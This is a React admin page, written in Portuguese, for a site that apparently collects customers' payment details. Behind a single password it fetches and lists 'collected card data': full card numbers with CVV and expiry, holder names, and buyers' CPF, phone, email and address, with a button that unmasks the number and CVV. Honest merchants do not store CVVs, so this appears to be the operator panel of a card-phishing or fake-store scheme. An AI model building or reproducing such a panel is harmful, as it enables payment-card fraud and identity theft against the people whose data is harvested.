'use client'

import { useState } from 'react'
import { Eye, EyeOff, CreditCard, User, Calendar, Lock } from 'lucide-react'

interface CardData {
  id: string
  timestamp: string
  customer: {
    name: string
    cpf: string
    phone: string
    email: string
    address: string
  }
  card: {
    number: string
    holderName: string
    expiryDate: string
    cvv: string
  }
  product: {
    name: string
    price: number
    quantity: number
  }
  total: number
}

export default function AdminPage() {
  const [password, setPassword] = useState('')
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [cardData, setCardData] = useState<CardData[]>([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [showCardNumbers, setShowCardNumbers] = useState<{ [key: string]: boolean }>({})

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setError('')

    try {
      const response = await fetch('/api/get-card-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password })
      })

      const result = await response.json()

      if (result.success) {
        setIsAuthenticated(true)
        setCardData(result.data)
      } else {
        setError('Senha incorreta')
      }
    } catch (err) {
      setError('Erro ao conectar')
    } finally {
      setLoading(false)
    }
  }

  const toggleCardVisibility = (id: string) => {
    setShowCardNumbers(prev => ({ ...prev, [id]: !prev[id] }))
  }

  const maskCardNumber = (number: string, show: boolean) => {
    if (show) return number
    return number.replace(/\d(?=\d{4})/g, '*')
  }

  const formatCurrency = (value: number) => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    }).format(value / 100)
  }

  const formatDate = (timestamp: string) => {
    return new Date(timestamp).toLocaleString('pt-BR')
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <Lock className="w-16 h-16 mx-auto text-blue-600 mb-4" />
            <h1 className="text-3xl font-bold text-gray-800">Área Administrativa</h1>
            <p className="text-gray-600 mt-2">Digite a senha para acessar</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Senha"
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none text-lg"
                required
              />
            </div>

            {error && (
              <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition-colors disabled:opacity-50"
            >
              {loading ? 'Verificando...' : 'Acessar'}
            </button>
          </form>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4 md:p-8">
      <div className="max-w-7xl mx-auto">
        <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
          <h1 className="text-3xl font-bold text-gray-800 mb-2">Dados de Cartões Coletados</h1>
          <p className="text-gray-600">Total de registros: {cardData.length}</p>
        </div>

        {cardData.length === 0 ? (
          <div className="bg-white rounded-2xl shadow-lg p-12 text-center">
            <CreditCard className="w-16 h-16 mx-auto text-gray-400 mb-4" />
            <p className="text-gray-600 text-lg">Nenhum dado coletado ainda</p>
          </div>
        ) : (
          <div className="space-y-4">
            {cardData.map((item) => (
              <div key={item.id} className="bg-white rounded-2xl shadow-lg p-6">
                <div className="flex justify-between items-start mb-4">
                  <div>
                    <span className="text-sm text-gray-500">ID: {item.id}</span>
                    <p className="text-sm text-gray-600 mt-1">{formatDate(item.timestamp)}</p>
                  </div>
                  <span className="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-semibold">
                    {formatCurrency(item.total)}
                  </span>
                </div>

                <div className="grid md:grid-cols-2 gap-6">
                  {/* Dados do Cliente */}
                  <div className="space-y-3">
                    <h3 className="font-semibold text-gray-800 flex items-center gap-2">
                      <User className="w-5 h-5" />
                      Dados do Cliente
                    </h3>
                    <div className="bg-gray-50 p-4 rounded-lg space-y-2 text-sm">
                      <p><strong>Nome:</strong> {item.customer.name}</p>
                      <p><strong>CPF:</strong> {item.customer.cpf}</p>
                      <p><strong>Telefone:</strong> {item.customer.phone}</p>
                      <p><strong>Email:</strong> {item.customer.email}</p>
                      <p><strong>Endereço:</strong> {item.customer.address}</p>
                    </div>
                  </div>

                  {/* Dados do Cartão */}
                  <div className="space-y-3">
                    <h3 className="font-semibold text-gray-800 flex items-center gap-2">
                      <CreditCard className="w-5 h-5" />
                      Dados do Cartão
                    </h3>
                    <div className="bg-gradient-to-br from-blue-600 to-blue-800 p-4 rounded-lg text-white space-y-3">
                      <div className="flex justify-between items-center">
                        <p className="font-mono text-lg tracking-wider">
                          {maskCardNumber(item.card.number, showCardNumbers[item.id])}
                        </p>
                        <button
                          onClick={() => toggleCardVisibility(item.id)}
                          className="bg-white/20 hover:bg-white/30 p-2 rounded-lg transition-colors"
                        >
                          {showCardNumbers[item.id] ? (
                            <EyeOff className="w-4 h-4" />
                          ) : (
                            <Eye className="w-4 h-4" />
                          )}
                        </button>
                      </div>
                      <p><strong>Titular:</strong> {item.card.holderName}</p>
                      <div className="flex justify-between">
                        <p><strong>Validade:</strong> {item.card.expiryDate}</p>
                        <p><strong>CVV:</strong> {showCardNumbers[item.id] ? item.card.cvv : '***'}</p>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Dados do Produto */}
                <div className="mt-4 bg-gray-50 p-4 rounded-lg">
                  <h3 className="font-semibold text-gray-800 mb-2">Produto</h3>
                  <div className="flex justify-between items-center">
                    <div>
                      <p className="font-medium">{item.product.name}</p>
                      <p className="text-sm text-gray-600">Quantidade: {item.product.quantity}</p>
                    </div>
                    <p className="text-lg font-bold text-gray-800">
                      {formatCurrency(item.product.price)}
                    </p>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}
